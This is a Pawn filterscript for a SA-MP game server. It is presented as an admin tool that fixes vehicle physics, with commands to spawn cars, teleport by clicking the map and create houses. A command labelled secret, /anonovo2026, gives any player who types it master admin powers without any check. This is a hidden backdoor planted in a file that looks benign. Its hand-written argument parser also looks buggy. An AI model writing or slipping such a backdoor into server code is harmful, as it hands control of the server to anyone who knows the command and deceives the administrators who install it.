#define FILTERSCRIPT
#include <a_samp>

#define NIVEL_MASTER 6

public OnFilterScriptInit() {
    print(">> [ADMIN MASTER 2026] Fisica de Veiculos Estabilizada!");
    return 1;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ) {
    if(GetPVarInt(playerid, "AdminLevel") == NIVEL_MASTER || IsPlayerAdmin(playerid)) {
        SetPlayerPosFindZ(playerid, fX, fY, fZ);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Teleportado!");
    }
    return 1;
}

public OnPlayerCommandText(playerid, cmdtext[]) {
    // Comando Secreto
    if(!strcmp(cmdtext, "/anonovo2026", true)) {
        SetPVarInt(playerid, "AdminLevel", NIVEL_MASTER);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Poderes MASTER 2026 ativados!");
        return 1;
    }

    if(GetPVarInt(playerid, "AdminLevel") < NIVEL_MASTER && !IsPlayerAdmin(playerid)) return 0;

    // Comando de Carro - Versao Estabilizada 2026
    if(!strfind(cmdtext, "/carro", true)) {
        new vID, c1, c2;
        if(sscanf_fix(cmdtext, vID, c1, c2)) {
            if(sscanf_fix(cmdtext, vID)) return SendClientMessage(playerid, -1, "Use: /carro [ID] [Cor1] [Cor2]");
            c1 = 1; c2 = 1;
        }

        if(vID < 400 || vID > 611) return SendClientMessage(playerid, -1, "ID Invalido.");

        new Float:pX, Float:pY, Float:pZ, Float:pA;
        GetPlayerPos(playerid, pX, pY, pZ); 
        GetPlayerFacingAngle(playerid, pA);

        // Criamos o carro no ar para evitar o bug do chão
        new v = CreateVehicle(vID, pX, pY, pZ + 3.0, pA, c1, c2, -1);
        
        // RESET DE FISICA RADICAL:
        SetVehicleVelocity(v, 0.0, 0.0, 0.0);
        SetVehicleAngularVelocity(v, 0.0, 0.0, 0.0);
        
        // Reset de rotacao (X e Y) - Isso endireita o carro no ar
        new Float:za;
        GetVehicleZAngle(v, za);
        SetVehicleZAngle(v, za); 

        SetVehicleVirtualWorld(v, GetPlayerVirtualWorld(playerid));
        LinkVehicleToInterior(v, GetPlayerInterior(playerid));
        
        PutPlayerInVehicle(playerid, v, 0);
        SendClientMessage(playerid, 0x00FF00FF, "Veiculo criado com suspensao alinhada!");
        return 1;
    }

    // Comando Criar Casa
    if(!strfind(cmdtext, "/criarcasa", true)) {
        SendClientMessage(playerid, 0xFFFF00FF, "Use o comando direto: /sethouse [ID]");
        return 1;
    }
    return 0;
}

stock sscanf_fix(const texto[], &v1 = -1, &v2 = -1, &v3 = -1) {
    new p = strfind(texto, " ", true);
    if(p == -1) return 1;
    v1 = strval(texto[p+1]);
    p = strfind(texto, " ", true, p+1);
    if(p == -1) return (v2 != -1);
    v2 = strval(texto[p+1]);
    p = strfind(texto, " ", true, p+1);
    if(p == -1) return (v3 != -1);
    v3 = strval(texto[p+1]);
    return 0;
}
